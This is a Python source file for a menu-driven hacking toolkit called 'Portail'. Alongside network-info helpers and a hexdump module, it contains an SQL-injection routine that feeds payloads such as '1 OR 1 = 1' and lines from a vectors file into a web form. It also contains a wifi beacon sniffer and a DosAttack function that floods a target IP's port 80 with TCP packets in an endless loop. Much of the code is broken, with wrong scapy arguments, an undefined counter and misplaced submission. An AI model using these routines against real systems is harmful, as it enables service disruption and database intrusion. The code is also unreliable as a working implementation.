import colorama
import os
import os.path as path
from scapy.all import *

# init deco #
colorama.init()
CF = colorama.Fore


class Colors(object):

    def __init__(self):
        Fore = colorama.Fore
        self.Cyan = Fore.CYAN
        self.Red = Fore.RED
        self.Green = Fore.GREEN
        self.Warning = Fore.YELLOW
        self.Reset = Fore.RESET
        
class NetWork(object):
    def __init__(self):
        pass

    def analyse(self):
        print(CF.GREEN)
        os.system('lshw -C network')
    
    def get_network_ether(self):
        print(CF.GREEN)
        os.system('ifconfig -a | grep eth')

    def VPN(self):
        option = input("enter an option -l (--load) to active and -f (--flush) to deactive \n -> ")
        os.system(f'sudo toriptables2.py {option}')



class Module:
    def __init__(self, incoming=False, verbose=False, options=None):
        # extract the file name from __file__. __file__ is proxymodules/name.py
        self.name = path.splitext(path.basename(__file__))[0]
        self.description = 'Print a hexdump of the received data'
        self.incoming = incoming  # incoming means module is on -im chain
        self.len = 16
        if options is not None:
            if 'length' in options.keys():
                self.len = int(options['length'])

    def help(self):
        return '\tlength: bytes per line (int)'

    def execute(self):
        # this is a pretty hex dumping function directly taken from
        # http://code.activestate.com/recipes/142812-hex-dumper/
        result = []
        data = []
        data_raw = input("input the data : ")
        for i in data_raw.split(','):
            data.append(int(i))

        digits = 2
        for i in range(0, len(data), self.len):
            s = data[i:i + self.len]
            hexa = ' '.join(['%0*X' % (digits, x) for x in s])
            text = ''.join([chr(x) if 0x20 <= x < 0x7F else '.' for x in s])
            result.append("%04X   %-*s   %s" % (i, self.len * (digits + 1), hexa, text))
        
        print(CF.MAGENTA,"\n".join(result))
        return data


class Sql(object):
    def __init__(self):
        pass
        

    def attack(self):
        self.url = input("Enter the full URL: ")
        import mechanize
        request = mechanize.Browser()
        request.open(self.url)
        formcount=0
        
        for frm in request.forms():
            print(frm.attrs)  
            try:
                if str(frm.attrs["id"])=="1":
                    break
            except:
                formcount=formcount+1
        request.select_form(nr=formcount)
        # request["id"] = "1 OR 1 = 1"
        response = request.submit()
        content = response.read()
        print(content)
        with open ('vectors.txt', 'r') as v:

            for line in v:
                browser = mechanize.Browser()
                browser.open(self.url)
                browser.select_form(nr = 0)
                browser['id'] = line
                output = open('response/' + str(attack_no) + '.txt', 'w')
                output.write(content)
                output.close()
                print(attack_no)
                attack_no += 1
            res = browser.submit()
            content = res.read()

class Classics(object):
    def __init__(self):
        pass

    def exit(self):
        print("Exiting ...")
        return os.sys.exit()
    def get_localisation(self):
        print("Getting the Localisation ...")
        return 'New York'


class Portail(object):

    def __init__(self):
        self.modes = [self.activate, self.Socket_connection, self.DosAttack]
        

    def activate(self):
        print(CF.GREEN,'Portail Activate')
        print(CF.YELLOW)
        for index, mode in enumerate(self.modes):
            print(f"{index} - {mode.__name__}")
        return self.interface()

    def Socket_connection(self):
        import socket
        import os
        os.system('sh /home/snowden/Programmation/App/NVD/security/commands/start_wlan1.sh')
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind(("mon0", 0x0003))
        ap_list = []
        while True:
            packet = s.recvfrom(2048)
            if packet[26] == "\x80":
                if packet[26:42] not in ap_list and \
                    ord(packet[63]) > 0:
                    ap_list.__add__(packet[36:42])
            
            print("SSID: ",(packet[64:64+ord(packet[63])], packet[36:42].encode('hex')))
    
    def DosAttack(self):
        source_IP = input("Enter IP address of Source: ")
        target_IP = input("Enter IP address of Target: ")
        source_port = int(input("Enter Source Port Number:"))
        i = 1

        while True:
            IP1 = IP(source_IP = source_IP, destination = target_IP)
            TCP1 = TCP(srcport = source_port, dstport = 80)
            pkt = IP1 / TCP1
            send(pkt, inter = .001)
            
            print ("packet sent ", i)
            i = i + 1

    @property
    def interface(self):
        return self.Input 
    
    @interface.getter
    def interface(self):
        self.image = """
                 ____   ___  ____ _____  _    ___ _     
                |  _ \ / _ \|  _ \_   _|/ \  |_ _| |    
                | |_) | | | | |_) || | / _ \  | || |    
                |  __/| |_| |  _ < | |/ ___ \ | || |___ 
                |_|    \___/|_| \_\|_/_/   \_\___|_____|
                                        

        """
        print(CF.YELLOW,self.image)
        self.portail_string = "#Portail> "
        print(CF.RESET)
        self.Input = ''
        while self.Input != 'exit':
            self.Input = int(input(self.portail_string))
            if self.Input in range(len(self.modes)):
                self.modes[self.Input]()
            else:
                print(Colors().Red,"not found")
                print(Colors().Reset)

